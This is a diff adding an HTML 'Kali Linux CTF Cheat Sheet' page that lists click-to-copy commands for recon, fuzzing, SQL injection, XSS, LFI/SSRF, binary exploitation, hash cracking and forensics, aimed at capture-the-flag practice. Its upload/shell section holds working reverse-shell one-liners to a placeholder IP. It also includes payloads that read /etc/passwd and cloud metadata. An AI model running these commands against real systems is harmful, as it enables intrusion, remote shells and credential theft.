@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kali Linux CTF Cheat Sheet</title>
+<style>
+body { font-family: Arial; background:#0f172a; color:#e2e8f0; margin:0; }
+header { padding:20px; text-align:center; background:#020617; }
+input { width:80%; padding:10px; margin:10px; border-radius:8px; }
+.tabs { display:flex; flex-wrap:wrap; justify-content:center; }
+.tab { padding:10px 15px; margin:5px; background:#1e293b; cursor:pointer; border-radius:6px; }
+.section { padding:20px; max-height:80vh; overflow-y:auto; }
+.command { background:#020617; padding:6px; margin:3px 0; border-radius:6px; cursor:pointer; font-size:12px; }
+.desc { display:none; font-size:11px; color:#94a3b8; margin-top:4px; }
+.desc { display:none; font-size:11px; color:#94a3b8; margin-top:4px; }
+.sub { color:#94a3b8; margin-top:10px; font-weight:bold; }
+</style>
+</head>
+<body>
+<header>
+<h1>💀 Kali Linux CTF Cheat Sheet</h1>
+<input type="text" id="search" placeholder="Search commands..." onkeyup="searchCommands()">
+</header>
+<div class="tabs">
+<div class="tab" onclick="filter('all')">All</div>
+<div class="tab" onclick="filter('web')">Web</div>
+<div class="tab" onclick="filter('binary')">Binary</div>
+<div class="tab" onclick="filter('crypto')">Crypto</div>
+<div class="tab" onclick="filter('forensics')">Forensics</div>
+<div class="tab" onclick="filter('general')">General</div>
+</div>
+<div class="section" id="commands">
+
+<div class="sub web">[WEB]</div>
+<!-- ~200 WEB COMMANDS (recon → fuzz → vulns → exploitation) -->
+<div class="command web">nmap -sC -sV target</div>
+<div class="command web">nmap -p- target</div>
+<div class="command web">nmap -A target</div>
+<div class="command web">nmap -T4 -Pn target</div>
+<div class="command web">nmap --script vuln target</div>
+<div class="command web">nmap -p80,443 --script=http-enum target</div>
+<div class="command web">nmap --script=http-title target</div>
+<div class="command web">nmap -sU target</div>
+<div class="command web">masscan -p1-65535 target --rate=1000</div>
+<div class="command web">whatweb target</div>
+<div class="command web">whatweb -a 3 target</div>
+<div class="command web">httpx -l list.txt</div>
+<div class="command web">httpx -status-code -title -tech-detect -l list.txt</div>
+<div class="command web">httprobe &lt; domains.txt</div>
+<div class="command web">dnsenum target.com</div>
+<div class="command web">dnsenum --enum target.com</div>
+<div class="command web">subfinder -d target.com</div>
+<div class="command web">subfinder -d target.com -all</div>
+<div class="command web">amass enum -d target.com</div>
+<div class="command web">amass intel -d target.com</div>
+
+<div class="sub web">[DIR / PARAM FUZZ]</div>
+<div class="command web">gobuster dir -u http://target -w wordlist</div>
+<div class="command web">gobuster dir -u http://target -w big.txt -x php,txt,html</div>
+<div class="command web">gobuster dns -d target.com -w wordlist</div>
+<div class="command web">ffuf -u http://target/FUZZ -w wordlist</div>
+<div class="command web">ffuf -u http://target/FUZZ -w wordlist -mc 200</div>
+<div class="command web">ffuf -u http://target/FUZZ -w common.txt -fc 404</div>
+<div class="command web">ffuf -u http://target/FUZZ -w big.txt -recursion</div>
+<div class="command web">ffuf -u http://target/?id=FUZZ -w nums.txt</div>
+<div class="command web">dirsearch -u http://target</div>
+<div class="command web">dirsearch -u http://target -e php,html,txt</div>
+<div class="command web">wfuzz -c -z file,wordlist.txt http://target/FUZZ</div>
+<div class="command web">wfuzz -c -z range,1-100 http://target?id=FUZZ</div>
+<div class="command web">wfuzz -c -z file,users.txt -z file,pass.txt http://target/login</div>
+
+<div class="sub web">[HTTP / HEADERS]</div>
+<div class="command web">curl http://target</div>
+<div class="command web">curl -I http://target
+<div class="desc">-I = Fetch only HTTP headers (HEAD request). Useful to check status codes, server info, cookies without downloading full page.</div>
+<div class="desc">-I = fetch headers only (HEAD request). Useful to check status, server info, cookies without downloading body.</div>
+</div>
+<div class="command web">curl -L http://target
+<div class="desc">-L = Follow redirects automatically (e.g., HTTP → HTTPS or login redirects).</div>
+<div class="desc">-L = follow redirects automatically. Useful when site redirects (e.g., HTTP → HTTPS, login flows).</div>
+</div>
+<div class="command web">curl -k https://target</div>
+<div class="command web">curl -X POST http://target -d "a=1"</div>
+<div class="command web">curl -H "User-Agent: test" http://target</div>
+<div class="command web">curl -H "Cookie: PHPSESSID=abc" http://target</div>
+<div class="command web">curl -H "X-Forwarded-For: 127.0.0.1" http://target</div>
+<div class="command web">curl -u user:pass http://target</div>
+<div class="command web">curl -F "file=@shell.php" http://target/upload</div>
+<div class="command web">curl -b cookies.txt http://target</div>
+<div class="command web">curl -c cookies.txt http://target/login</div>
+
+<div class="sub web">[SQLi]</div>
+<div class="command web">sqlmap -u "http://target?id=1" --dbs</div>
+<div class="command web">sqlmap -u "http://target?id=1" --tables</div>
+<div class="command web">sqlmap -u "http://target?id=1" --columns</div>
+<div class="command web">sqlmap -u "http://target?id=1" --dump</div>
+<div class="command web">sqlmap -u "http://target?id=1" --os-shell</div>
+<div class="command web">sqlmap -r req.txt --dbs</div>
+<div class="command web">sqlmap -r req.txt --dump</div>
+<div class="command web">sqlmap --tamper=space2comment -u url</div>
+<div class="command web">sqlmap --level=5 --risk=3 -u url</div>
+
+<div class="sub web">[XSS]</div>
+<div class="command web">curl "http://target?q=&lt;script&gt;alert(1)&lt;/script&gt;"</div>
+<div class="command web">dalfox url</div>
+<div class="command web">xsser --url url</div>
+<div class="command web">dalfox file urls.txt</div>
+<div class="command web">dalfox url -b yourcollab.com</div>
+
+<div class="sub web">[LFI/RFI]</div>
+<div class="command web">curl http://target?page=../../../../etc/passwd</div>
+<div class="command web">curl http://target?page=..%2f..%2f..%2fetc%2fpasswd</div>
+<div class="command web">curl http://target?page=php://filter/convert.base64-encode/resource=index.php</div>
+<div class="command web">curl http://target?page=data://text/plain,hello</div>
+<div class="command web">curl http://target?page=expect://id</div>
+
+<div class="sub web">[SSRF]</div>
+<div class="command web">curl http://target?url=http://127.0.0.1</div>
+<div class="command web">curl http://target?url=http://169.254.169.254/latest/meta-data/</div>
+<div class="command web">curl http://target?url=file:///etc/passwd</div>
+<div class="command web">curl http://target?url=gopher://127.0.0.1:80/_GET%20/</div>
+
+<div class="sub web">[UPLOAD / SHELL]</div>
+<div class="command web">nc -lvnp 4444</div>
+<div class="command web">bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1</div>
+<div class="command web">python3 -c 'import pty;pty.spawn("/bin/bash")'</div>
+<div class="command web">php -r '$sock=fsockopen("IP",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</div>
+<div class="command web">python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</div>
+
+<div class="sub binary">[BINARY + GDB]</div>
+<!-- ~100 BINARY/GDB COMMANDS -->
+<div class="command binary">checksec --file=bin</div>
+<div class="command binary">gdb ./bin</div>
+<div class="command binary">run</div>
+<div class="command binary">start</div>
+<div class="command binary">break main</div>
+<div class="command binary">b *0x401000</div>
+<div class="command binary">info functions</div>
+<div class="command binary">info registers</div>
+<div class="command binary">info proc mappings</div>
+<div class="command binary">disassemble main</div>
+<div class="command binary">x/20x $rsp</div>
+<div class="command binary">x/s $rdi</div>
+<div class="command binary">stepi</div>
+<div class="command binary">next</div>
+<div class="command binary">continue</div>
+<div class="command binary">pattern create 200</div>
+<div class="command binary">pattern offset 0x61616161</div>
+<div class="command binary">vmmap</div>
+<div class="command binary">ropper --file bin</div>
+<div class="command binary">one_gadget libc.so</div>
+<div class="command binary">objdump -d bin</div>
+<div class="command binary">strings bin</div>
+<div class="command binary">ltrace ./bin</div>
+<div class="command binary">strace ./bin</div>
+<div class="command binary">radare2 -A bin</div>
+<div class="command binary">r2 -d bin</div>
+<div class="command binary">aaa</div>
+<div class="command binary">pdf @ main</div>
+<div class="command binary">afl</div>
+<div class="command binary">izz</div>
+<!-- pwntools ~50 -->
+<div class="command binary">from pwn import *</div>
+<div class="command binary">context.binary = './bin'</div>
+<div class="command binary">p = process('./bin')</div>
+<div class="command binary">p = remote('ip',port)</div>
+<div class="command binary">p.recv()</div>
+<div class="command binary">p.recvuntil('>')</div>
+<div class="command binary">p.sendline('payload')</div>
+<div class="command binary">p.sendafter('>', 'data')</div>
+<div class="command binary">cyclic(200)</div>
+<div class="command binary">cyclic_find(0x61616161)</div>
+<div class="command binary">ELF('./bin')</div>
+<div class="command binary">ROP(ELF('./bin'))</div>
+<div class="command binary">p.interactive()</div>
+
+<div class="sub crypto">[CRYPTO]</div>
+<!-- ~100 CRYPTO -->
+<div class="command crypto">hashcat -m 0 hash.txt rockyou.txt</div>
+<div class="command crypto">hashcat -m 1000 hash.txt rockyou.txt</div>
+<div class="command crypto">john hash.txt --wordlist=rockyou.txt</div>
+<div class="command crypto">john --show hash.txt</div>
+<div class="command crypto">base64 -d file</div>
+<div class="command crypto">base64 file</div>
+<div class="command crypto">xxd -r file</div>
+<div class="command crypto">xxd file</div>
+<div class="command crypto">openssl enc -aes-256-cbc -d -in file</div>
+<div class="command crypto">openssl rsa -in key.pem -text</div>
+<div class="command crypto">gpg --decrypt file.gpg</div>
+<div class="command crypto">RsaCtfTool.py --publickey key.pem</div>
+<div class="command crypto">RsaCtfTool.py --attack all --publickey key.pem</div>
+<div class="command crypto">rot13 text</div>
+<div class="command crypto">echo text | tr a-z n-za-m</div>
+<div class="command crypto">hashid hash.txt</div>
+<div class="command crypto">hash-identifier</div>
+
+<div class="sub forensics">[FORENSICS]</div>
+<!-- ~100 FORENSICS -->
+<div class="command forensics">binwalk -e file</div>
+<div class="command forensics">binwalk file</div>
+<div class="command forensics">foremost -i file</div>
+<div class="command forensics">strings file</div>
+<div class="command forensics">strings -n 8 file</div>
+<div class="command forensics">exiftool file</div>
+<div class="command forensics">tshark -r file.pcap</div>
+<div class="command forensics">tcpdump -r file.pcap</div>
+<div class="command forensics">volatility -f memdump imageinfo</div>
+<div class="command forensics">volatility -f memdump pslist</div>
+<div class="command forensics">volatility -f memdump netscan</div>
+<div class="command forensics">steghide extract -sf file</div>
+<div class="command forensics">zsteg file.png</div>
+
+<div class="sub general">[GENERAL]</div>
+<!-- ~100 GENERAL (incl. grep focus) -->
+<div class="command general">ls -la</div>
+<div class="command general">pwd</div>
+<div class="command general">whoami</div>
+<div class="command general">id</div>
+<div class="command general">sudo -l</div>
+<div class="command general">ps aux</div>
+<div class="command general">top</div>
+<div class="command general">htop</div>
+<div class="command general">netstat -tulnp</div>
+<div class="command general">ss -tulnp</div>
+<div class="command general">ip a</div>
+<div class="command general">ifconfig</div>
+<div class="command general">route -n</div>
+<div class="command general">arp -a</div>
+<div class="command general">history</div>
+<div class="command general">clear</div>
+<div class="command general">python3 -m http.server 8000</div>
+<div class="command general">nc -lvnp 4444</div>
+<div class="command general">nc target 80</div>
+<div class="command general">scp file user@host:/tmp</div>
+<div class="command general">wget http://server/file</div>
+<div class="command general">curl -O http://server/file</div>
+
+<div class="sub general">[GREP & TEXT]</div>
+<div class="command general">grep "text" file.txt</div>
+<div class="command general">grep -i "text" file.txt</div>
+<div class="command general">grep -r "text" /dir</div>
+<div class="command general">grep -n "text" file.txt</div>
+<div class="command general">grep -v "text" file.txt</div>
+<div class="command general">grep -c "text" file.txt</div>
+<div class="command general">grep -l "text" *.log</div>
+<div class="command general">grep -E "admin|root" file.txt</div>
+<div class="command general">grep -o "pattern" file.txt</div>
+<div class="command general">grep --color=auto "text" file.txt</div>
+<div class="command general">cat file.txt | grep "text"</div>
+<div class="command general">strings file | grep flag</div>
+<div class="command general">ps aux | grep apache</div>
+<div class="command general">netstat -tulnp | grep 80</div>
+<div class="command general">grep -r "password" /etc</div>
+<div class="command general">grep -r "flag" .</div>
+<div class="command general">grep -r "BEGIN RSA" .</div>
+
+<div class="sub general">[FIND]</div>
+<div class="command general">find / -name file.txt</div>
+<div class="command general">find / -type f -name "*.log"</div>
+<div class="command general">find / -perm -4000 2>/dev/null</div>
+<div class="command general">find / -writable 2>/dev/null</div>
+<div class="command general">find / -user root</div>
+<div class="command general">find . -size +10M</div>
+<div class="command general">find / -name "flag*" 2>/dev/null</div>
+
+</div>
+
+</div>
+
+<script>
+function searchCommands(){
+let input=document.getElementById('search').value.toLowerCase();
+let cmds=document.getElementsByClassName('command');
+for(let i=0;i<cmds.length;i++){
+cmds[i].style.display=cmds[i].innerText.toLowerCase().includes(input)?'':'none';
+}
+}
+function filter(cat){
+let cmds=document.getElementsByClassName('command');
+for(let i=0;i<cmds.length;i++){
+cmds[i].style.display=(cat==='all'||cmds[i].classList.contains(cat))?'':'none';
+}
+}
+document.querySelectorAll('.command').forEach(cmd=>{
+cmd.onclick=(e)=>{
+let text = cmd.childNodes[0].nodeValue.trim();
+navigator.clipboard.writeText(text);
+let desc = cmd.querySelector('.desc');
+if(desc){
+desc.style.display = (desc.style.display === 'block') ? 'none' : 'block';
+}
+}
+});
+</script>
+
+</body>
+</html>
